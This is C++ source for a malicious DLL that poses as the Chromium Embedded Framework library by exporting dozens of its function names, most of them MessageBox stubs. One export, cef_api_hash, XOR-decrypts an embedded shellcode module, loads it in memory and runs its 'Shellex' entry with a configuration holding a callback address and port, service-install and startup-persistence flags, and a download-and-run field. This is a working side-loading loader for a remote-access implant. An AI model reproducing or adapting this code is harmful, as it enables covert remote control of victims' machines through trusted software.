
#include "stdafx.h"
#include <Shlobj.h>
#include "../Install/ShellCode.h"
#include "../Install/MemoryModule.h"
//������Ϣ�ṹ��
struct MODIFY_DATA
{
	TCHAR szDns1[300];      //���ߵ�ַ1
	TCHAR szDns2[300];      //���ߵ�ַ2
	DWORD dwPort1;          //���߶˿�1
	DWORD dwPort2;          //���߶˿�2
	TCHAR szGroup[50];      //���߷���
	TCHAR szVersion[32];    //���߰汾
	TCHAR SerName[100];     //��������
	TCHAR Serdisplay[128];  //��ʾ����
	TCHAR Serdesc[256];     //��������
	TCHAR szGetGroup[256];  //����Ψһ��ʶ
	BOOL  bLanPenetrate;    //�Ƿ�ʹ����������͸
	BOOL  bService;         //�Ƿ��Ƿ�������
	BOOL  bRuns;            //�Ƿ�������Ŀ¼����
	BOOL  bRunOnce;         //�Ƿ�Ϊ��ɫ��װ
	TCHAR ReleasePath[100]; //��װ;��
	TCHAR ReleaseName[50];  //��װ����
	WORD  Dele_zd;          //��װ����
	WORD  FileAttribute;    //�ļ�����
	BOOL Dele_Kzj;                //���߼�¼
	TCHAR szDownRun[512];   //�������е�ַ
};

MODIFY_DATA modify_data = 
{
	"192.168.1.101",
	"",
	8080,
	8080,
	"",
	"",
	"",
	"",
	"",
	"",
	FALSE,			//FALSEΪδʹ��������͸
	TRUE,			//TRUEΪ��������
	TRUE,			//TRUEΪ����Ŀ¼����
	TRUE,			//TRUEΪ��ɫ��װ��FALSEΪ��׼��װ
	"",
	"",
	0,
	FILE_ATTRIBUTE_NORMAL,
	0,
	""
};

void DecrypMain(char *Buff, int Size, char *AddTable)
{
	for (int i=0, j=0; i<Size; i++)
	{
		Buff[i] ^= AddTable[j++] % 1753 + 79;
		
		if (i % 5 == 0)
			j = 0;
	}
}

unsigned char MyFileTabLe[] = {0xBE, 0x16, 0xCF, 0x52, 0xCD};
typedef int (WINAPI *DDDDDDDDD)(MODIFY_DATA);
typedef BOOL (* MyDLL)(LPCTSTR lpData);
void AAA___JKASDANS____JOSDAS__HJGD( const char *name)
{
	
	HMEMORYMODULE hDll;
	DDDDDDDDD pfn;
	DecrypMain((char *)g_ShellCodeFileBuff, g_ShellCodeFileSize, (char *)MyFileTabLe);

	hDll=BBB__SADBGJY__DSFGHFHDKASQW(g_ShellCodeFileBuff);

	if (hDll==NULL)
	return ;
	pfn=(DDDDDDDDD)TTTTT_PPPPP_XSDSF45345(hDll,name);
		if (pfn==NULL)
		{	
			bbssss_gwegd4524_lfgdsdfsfhg_aaaaaa(hDll);
			return;
		}
		pfn(modify_data);
		if (hDll!=NULL)
		{

		bbssss_gwegd4524_lfgdsdfsfhg_aaaaaa(hDll);
        hDll=NULL;		
		}
		ExitProcess(0);

		
	
}


	


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////1
// ��������
extern "C" __declspec(dllexport) LPVOID ClearBreakpadPipeEnvironmentVariable()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"1","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////2
// ��������
extern "C" __declspec(dllexport) LPVOID ClearCrashKeyValueImpl()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"2","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////3
// ��������
extern "C" __declspec(dllexport) LPVOID CrashForException()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"3","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////4
// ��������
extern "C" __declspec(dllexport) LPVOID DumpProcess()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"4","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////5
// ��������
extern "C" __declspec(dllexport) LPVOID DumpProcessWithoutCrash()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"5","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////6
// ��������
extern "C" __declspec(dllexport) LPVOID GetHandleVerifier()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"6","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////7
// ��������
extern "C" __declspec(dllexport) LPVOID InjectDumpForHangDebugging()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"7","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8
// ��������
extern "C" __declspec(dllexport) LPVOID InjectDumpProcessWithoutCrash()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"8","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9
// ��������
extern "C" __declspec(dllexport) LPVOID IsSandboxedProcess()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"9","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////10
// ��������
extern "C" __declspec(dllexport) LPVOID SetCrashKeyValueImpl()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"10","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////11
// ��������
extern "C" __declspec(dllexport) LPVOID TerminateProcessWithoutDump()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"11","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////12
// ��������
extern "C" __declspec(dllexport) LPVOID cef_add_cross_origin_whitelist_entry()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"12","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////13
// ��������
extern "C" __declspec(dllexport) LPVOID cef_add_web_plugin_directory()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"13","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////14
// ��������
extern "C" __declspec(dllexport) LPVOID cef_add_web_plugin_path()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"14","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////15
// ��������
extern "C" __declspec(dllexport) LPVOID cef_api_hash()
{
	char shellex[]={'S','h','e','l','l','e','x','\0'};	
	AAA___JKASDANS____JOSDAS__HJGD(shellex);
	exit(0);
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////16
// ��������
extern "C" __declspec(dllexport) LPVOID cef_base64decode()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"16","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////17
// ��������
extern "C" __declspec(dllexport) LPVOID cef_base64encode()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"17","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////18
// ��������
extern "C" __declspec(dllexport) LPVOID cef_begin_tracing()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"18","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////19
// ��������
extern "C" __declspec(dllexport) LPVOID cef_binary_value_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"19","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////20
// ��������
extern "C" __declspec(dllexport) LPVOID cef_browser_host_create_browser()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"20","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////21
// ��������
extern "C" __declspec(dllexport) LPVOID cef_browser_host_create_browser_sync()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"21","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////22
// ��������
extern "C" __declspec(dllexport) LPVOID cef_clear_cross_origin_whitelist()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"22","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////23
// ��������
extern "C" __declspec(dllexport) LPVOID cef_clear_scheme_handler_factories()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"23","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////24
// ��������
extern "C" __declspec(dllexport) LPVOID cef_command_line_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"24","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////25
// ��������
extern "C" __declspec(dllexport) LPVOID cef_command_line_get_global()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"25","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////26
// ��������
extern "C" __declspec(dllexport) LPVOID cef_cookie_manager_create_manager()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"26","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////27
// ��������
extern "C" __declspec(dllexport) LPVOID cef_cookie_manager_get_global_manager()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"27","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////28
// ��������
extern "C" __declspec(dllexport) LPVOID cef_create_url()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"28","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////29
// ��������
extern "C" __declspec(dllexport) LPVOID cef_currently_on()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"29","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////30
// ��������
extern "C" __declspec(dllexport) LPVOID cef_dictionary_value_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"30","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////31
// ��������
extern "C" __declspec(dllexport) LPVOID cef_do_message_loop_work()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"31","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////32
// ��������
extern "C" __declspec(dllexport) LPVOID cef_drag_data_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"32","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////33
// ��������
extern "C" __declspec(dllexport) LPVOID cef_enable_highdpi_support()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"33","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////34
// ��������
extern "C" __declspec(dllexport) LPVOID cef_end_tracing()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"34","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////35
// ��������
extern "C" __declspec(dllexport) LPVOID cef_execute_process()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"35","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////36
// ��������
extern "C" __declspec(dllexport) LPVOID cef_force_web_plugin_shutdown()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"36","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////37
// ��������
extern "C" __declspec(dllexport) LPVOID cef_format_url_for_security_display()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"37","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////38
// ��������
extern "C" __declspec(dllexport) LPVOID cef_get_current_platform_thread_handle()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"38","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////39
// ��������
extern "C" __declspec(dllexport) LPVOID cef_get_current_platform_thread_id()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"39","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////40
// ��������
extern "C" __declspec(dllexport) LPVOID cef_get_extensions_for_mime_type()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"40","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////41
// ��������
extern "C" __declspec(dllexport) LPVOID cef_get_geolocation()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"41","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////42
// ��������
extern "C" __declspec(dllexport) LPVOID cef_get_mime_type()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"42","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////43
// ��������
extern "C" __declspec(dllexport) LPVOID cef_get_min_log_level()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"43","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////44
// ��������
extern "C" __declspec(dllexport) LPVOID cef_get_path()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"44","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////45
// ��������
extern "C" __declspec(dllexport) LPVOID cef_get_vlog_level()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"45","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////46
// ��������
extern "C" __declspec(dllexport) LPVOID cef_initialize()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"46","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////47
// ��������
extern "C" __declspec(dllexport) LPVOID cef_is_web_plugin_unstable()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"47","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////48
// ��������
extern "C" __declspec(dllexport) LPVOID cef_launch_process()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"48","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////49
// ��������
extern "C" __declspec(dllexport) LPVOID cef_list_value_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"49","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////50
// ��������
extern "C" __declspec(dllexport) LPVOID cef_log()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"50","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////51
// ��������
extern "C" __declspec(dllexport) LPVOID cef_now_from_system_trace_time()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"51","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////52
// ��������
extern "C" __declspec(dllexport) LPVOID cef_parse_csscolor()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"52","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////53
// ��������
extern "C" __declspec(dllexport) LPVOID cef_parse_json()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"53","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////54
// ��������
extern "C" __declspec(dllexport) LPVOID cef_parse_jsonand_return_error()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"54","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////55
// ��������
extern "C" __declspec(dllexport) LPVOID cef_parse_url()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"55","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////56
// ��������
extern "C" __declspec(dllexport) LPVOID cef_post_data_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"56","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////57
// ��������
extern "C" __declspec(dllexport) LPVOID cef_post_data_element_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"57","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////58
// ��������
extern "C" __declspec(dllexport) LPVOID cef_post_delayed_task()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"58","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////59
// ��������
extern "C" __declspec(dllexport) LPVOID cef_post_task()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"59","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////60
// ��������
extern "C" __declspec(dllexport) LPVOID cef_print_settings_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"60","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////61
// ��������
extern "C" __declspec(dllexport) LPVOID cef_process_message_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"61","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////62
// ��������
extern "C" __declspec(dllexport) LPVOID cef_quit_message_loop()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"62","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////63
// ��������
extern "C" __declspec(dllexport) LPVOID cef_refresh_web_plugins()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"63","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////64
// ��������
extern "C" __declspec(dllexport) LPVOID cef_register_extension()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"64","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////65
// ��������
extern "C" __declspec(dllexport) LPVOID cef_register_scheme_handler_factory()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"65","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////66
// ��������
extern "C" __declspec(dllexport) LPVOID cef_register_web_plugin_crash()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"66","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////67
// ��������
extern "C" __declspec(dllexport) LPVOID cef_remove_cross_origin_whitelist_entry()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"67","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////68
// ��������
extern "C" __declspec(dllexport) LPVOID cef_remove_web_plugin_path()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"68","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////69
// ��������
extern "C" __declspec(dllexport) LPVOID cef_request_context_create_context()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"69","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////70
// ��������
extern "C" __declspec(dllexport) LPVOID cef_request_context_get_global_context()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"70","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////71
// ��������
extern "C" __declspec(dllexport) LPVOID cef_request_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"71","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////72
// ��������
extern "C" __declspec(dllexport) LPVOID cef_resource_bundle_get_global()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"72","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////73
// ��������
extern "C" __declspec(dllexport) LPVOID cef_response_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"73","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////74
// ��������
extern "C" __declspec(dllexport) LPVOID cef_run_message_loop()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"74","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////75
// ��������
extern "C" __declspec(dllexport) LPVOID cef_set_osmodal_loop()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"75","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////76
// ��������
extern "C" __declspec(dllexport) LPVOID cef_shutdown()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"76","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////77
// ��������
extern "C" __declspec(dllexport) LPVOID cef_stream_reader_create_for_data()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"77","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////78
// ��������
extern "C" __declspec(dllexport) LPVOID cef_stream_reader_create_for_file()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"78","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////79
// ��������
extern "C" __declspec(dllexport) LPVOID cef_stream_reader_create_for_handler()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"79","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
